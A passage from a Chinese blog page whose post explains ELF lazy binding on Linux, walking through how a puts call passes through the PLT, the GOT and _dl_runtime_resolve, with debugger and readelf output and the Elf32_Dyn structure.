<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Resit much,Obey little">
<meta property="og:type" content="website">
<meta property="og:title" content="ZERO-A-ONE">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Resit much,Obey little">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZERO-A-ONE">
<meta name="twitter:description" content="Resit much,Obey little">
  <link rel="canonical" href="http://yoursite.com/page/5/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Searching..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/14/╤╙│┘░≤╢¿╨í╠╕/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/14/╤╙│┘░≤╢¿╨í╠╕/" class="post-title-link" itemprop="url">延迟绑定小谈</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-14 08:51:48 / Modified: 23:52:18" itemprop="dateCreated datePublished" datetime="2019-10-14T08:51:48-07:00">2019-10-14</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy  binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，这个<strong>puts</strong>是调用的<strong>libc</strong>这个动态链接库导出的一个函数。编译它，看看<strong>puts</strong>是怎么被调用的 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">080482E0</span> ; <span class="function"><span class="keyword">int</span> <span class="title">puts</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span></span><br><span class="line">.plt:080482E0 _puts           proc near               ; CODE XREF: main+19↓p</span><br><span class="line">.plt:<span class="number">080482E0</span></span><br><span class="line">.plt:<span class="number">080482E0</span> s               = dword ptr  <span class="number">4</span></span><br><span class="line">.plt:<span class="number">080482E0</span></span><br><span class="line">.plt:<span class="number">080482E0</span>                 jmp     ds:off_804A00Cc</span><br><span class="line">.plt:<span class="number">080482E0</span> _puts           endp</span><br><span class="line">.plt:<span class="number">080482E0</span></span><br></pre></td></tr></table></figure>

<p> <strong>puts</strong>会<strong>call</strong>到<strong>off_804A00Cc</strong>这里，这里就是“<strong>jmp</strong> [<strong>GOT</strong>表地址]”的这样一条指令， 跟一下，看看这个<strong>off_804A00C</strong>在第一次调用时是什么东西 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint *<span class="number">0x08048424</span></span><br><span class="line">pwndbg&gt; si</span><br><span class="line"><span class="number">0x080482e0</span> in <span class="built_in">puts</span>@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0xf7fb4dbc (environ) —▸ 0xffffd10c —▸ 0xffffd2ff ◂— 'XDG_VTNR=7'</span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  <span class="number">0xffffd070</span> ◂— <span class="number">0x1</span></span><br><span class="line"> EDX  <span class="number">0xffffd094</span> ◂— <span class="number">0x0</span></span><br><span class="line"> EDI  <span class="number">0xf7fb3000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"> ESI  <span class="number">0xf7fb3000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"> EBP  <span class="number">0xffffd058</span> ◂— <span class="number">0x0</span></span><br><span class="line"> ESP  <span class="number">0xffffd03c</span> —▸ <span class="number">0x8048429</span> ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"> EIP  <span class="number">0x80482e0</span> (<span class="built_in">puts</span>@plt) ◂— jmp    dword ptr [<span class="number">0x804a00c</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x80482e0</span>  &lt;<span class="built_in">puts</span>@plt&gt;                  jmp    dword ptr [<span class="number">0x804a00c</span>]</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x80482e6</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line">   <span class="number">0x80482eb</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x80482d0</span></span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x80482d0</span>                              push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line">   <span class="number">0x80482d6</span>                              jmp    dword ptr [<span class="number">0x804a008</span>] &lt;<span class="number">0xf7fee000</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">   <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">   <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;<span class="number">0xf7fe77e0</span>&gt;</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffd03c</span> —▸ <span class="number">0x8048429</span> ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffd040</span> —▸ <span class="number">0x80484c0</span> ◂— dec    eax <span class="comment">/* 'Hello Pwn\n' */</span></span><br><span class="line">02:0008│      0xffffd044 —▸ 0xffffd104 —▸ 0xffffd2de ◂— '/home/syc/Downloads/retdll/a.out'</span><br><span class="line">03:000c│      0xffffd048 —▸ 0xffffd10c —▸ 0xffffd2ff ◂— 'XDG_VTNR=7'</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffd04c</span> —▸ <span class="number">0x8048461</span> ◂— lea    eax, [ebx - <span class="number">0xf8</span>]</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│      <span class="number">0xffffd050</span> —▸ <span class="number">0xf7fb33dc</span> (__exit_funcs) —▸ <span class="number">0xf7fb41e0</span> (initial) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│      <span class="number">0xffffd054</span> —▸ <span class="number">0xffffd070</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│ ebp  <span class="number">0xffffd058</span> ◂— <span class="number">0x0</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>  <span class="number">80482e0</span> <span class="built_in">puts</span>@plt</span><br><span class="line">   f <span class="number">1</span>  <span class="number">8048429</span></span><br><span class="line">   f <span class="number">2</span> f7e19637 __libc_start_main+<span class="number">247</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>可以发现，是<strong>0x80482e6</strong>这个地址，并不直接是<strong>libc</strong>的<strong>puts</strong>函数的地址。这是因为<strong>linux</strong>在程序加载时使用了延迟绑定(<strong>lazyload</strong>)，只有等到这个函数被调用了，才去把这个函数在<strong>libc</strong>的地址放到<strong>GOT</strong>表中。接下来，会再<strong>push</strong>一个<strong>0</strong>，再<strong>push</strong>一个<strong>dword ptr  [0x804a004]</strong>，最后跳到<strong>libc</strong>的<strong>_dl_runtime_resolve</strong>（<code>call   _dl_fixup</code>）去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是<strong>puts</strong>）的地址，然后放到相应的<strong>GOT</strong>表，并且调用它。而这个函数的地址也是从<strong>GOT</strong>表取并且jmp [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定</p>
<p> 了解一下elf各段之间的关系 ，才能更好的理解前面从PLT到GOT的过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -S a.out</span><br><span class="line">There are <span class="number">29</span> section headers, starting at offset <span class="number">0x114c</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .interp           PROGBITS        <span class="number">08048154</span> <span class="number">000154</span> <span class="number">000013</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .note.ABI-tag     NOTE            <span class="number">08048168</span> <span class="number">000168</span> <span class="number">000020</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .note.gnu.build-i NOTE            <span class="number">08048188</span> <span class="number">000188</span> <span class="number">000024</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .gnu.hash         GNU_HASH        <span class="number">080481</span>ac <span class="number">0001</span>ac <span class="number">000020</span> <span class="number">04</span>   A  <span class="number">5</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .dynsym           DYNSYM          <span class="number">080481</span>cc <span class="number">0001</span>cc <span class="number">000050</span> <span class="number">10</span>   A  <span class="number">6</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">6</span>] .dynstr           STRTAB          <span class="number">0804821</span>c <span class="number">00021</span>c <span class="number">00004</span>a <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .gnu.version      VERSYM          <span class="number">08048266</span> <span class="number">000266</span> <span class="number">00000</span>a <span class="number">02</span>   A  <span class="number">5</span>   <span class="number">0</span>  <span class="number">2</span></span><br><span class="line">  [ <span class="number">8</span>] .gnu.version_r    VERNEED         <span class="number">08048270</span> <span class="number">000270</span> <span class="number">000020</span> <span class="number">00</span>   A  <span class="number">6</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">9</span>] .rel.dyn          REL             <span class="number">08048290</span> <span class="number">000290</span> <span class="number">000008</span> <span class="number">08</span>   A  <span class="number">5</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">10</span>] .rel.plt          REL             <span class="number">08048298</span> <span class="number">000298</span> <span class="number">000010</span> <span class="number">08</span>  AI  <span class="number">5</span>  <span class="number">24</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">11</span>] .init             PROGBITS        <span class="number">080482</span>a8 <span class="number">0002</span>a8 <span class="number">000023</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">12</span>] .plt              PROGBITS        <span class="number">080482</span>d0 <span class="number">0002</span>d0 <span class="number">000030</span> <span class="number">04</span>  AX  <span class="number">0</span>   <span class="number">0</span> <span class="number">16</span></span><br><span class="line">  [<span class="number">13</span>] .plt.got          PROGBITS        <span class="number">08048300</span> <span class="number">000300</span> <span class="number">000008</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">8</span></span><br><span class="line">  [<span class="number">14</span>] .text             PROGBITS        <span class="number">08048310</span> <span class="number">000310</span> <span class="number">000192</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span> <span class="number">16</span></span><br><span class="line">  [<span class="number">15</span>] .fini             PROGBITS        <span class="number">080484</span>a4 <span class="number">0004</span>a4 <span class="number">000014</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">16</span>] .rodata           PROGBITS        <span class="number">080484b</span>8 <span class="number">0004b</span>8 <span class="number">000013</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">17</span>] .eh_frame_hdr     PROGBITS        <span class="number">080484</span>cc <span class="number">0004</span>cc <span class="number">00002</span>c <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">18</span>] .eh_frame         PROGBITS        <span class="number">080484f</span>8 <span class="number">0004f</span>8 <span class="number">0000</span>cc <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">19</span>] .init_array       INIT_ARRAY      <span class="number">08049f</span>08 <span class="number">000f</span>08 <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">20</span>] .fini_array       FINI_ARRAY      <span class="number">08049f</span>0c <span class="number">000f</span>0c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">21</span>] .jcr              PROGBITS        <span class="number">08049f</span>10 <span class="number">000f</span>10 <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">22</span>] .dynamic          DYNAMIC         <span class="number">08049f</span>14 <span class="number">000f</span>14 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">23</span>] .got              PROGBITS        <span class="number">08049f</span>fc <span class="number">000f</span>fc <span class="number">000004</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">24</span>] .got.plt          PROGBITS        <span class="number">0804</span>a000 <span class="number">001000</span> <span class="number">000014</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">25</span>] .data             PROGBITS        <span class="number">0804</span>a014 <span class="number">001014</span> <span class="number">000008</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS          <span class="number">0804</span>a01c <span class="number">00101</span>c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">27</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">00101</span>c <span class="number">000035</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">28</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">001051</span> <span class="number">0000f</span>a <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>我们一般只关注几个比较重要的 section </p>
<table>
<thead>
<tr>
<th align="center">.dynsym</th>
<th align="center">动态链接符号表</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>.dynstr</strong></td>
<td align="center"><strong>动态链接的字符串</strong></td>
</tr>
<tr>
<td align="center"><strong>.rel.dyn</strong></td>
<td align="center"><strong>变量重定位</strong></td>
</tr>
<tr>
<td align="center"><strong>.rel.plt</strong></td>
<td align="center"><strong>函数重定位</strong></td>
</tr>
<tr>
<td align="center"><strong>.got</strong></td>
<td align="center"><strong>全局变量偏移表</strong></td>
</tr>
<tr>
<td align="center"><strong>.got.plt</strong></td>
<td align="center"><strong>全局函数偏移表</strong></td>
</tr>
</tbody></table>
<h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>包含了一些关于动态链接的关键信息，在里这它长这样，事实上这个section所有程序都差不多 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -d a.out</span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482a8</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x80484a4</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f08</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804821c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">74</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x8048298</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x8048290</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x8048270</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048266</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>然后<strong>.dynamic</strong>每个元素的结构体是这样的， 一个 <strong>Elf_Dyn</strong> 是一个键值对，其中 <strong>d_tag</strong> 是键，<strong>d_value</strong> 是值 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p>这个<strong>section</strong>的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p>
<h3 id="DT-JMPREL-rel-plt"><a href="#DT-JMPREL-rel-plt" class="headerlink" title="DT_JMPREL(.rel.plt)"></a>DT_JMPREL(.rel.plt)</h3><p> 可以看到<code>puts</code>符号位于<strong>.rel.plt</strong>的第一个，也就是偏移为<strong>0×0</strong>的地方，这里的<code>r_offset</code>（偏移量）就是<strong>.got.plt</strong>的地址 </p>
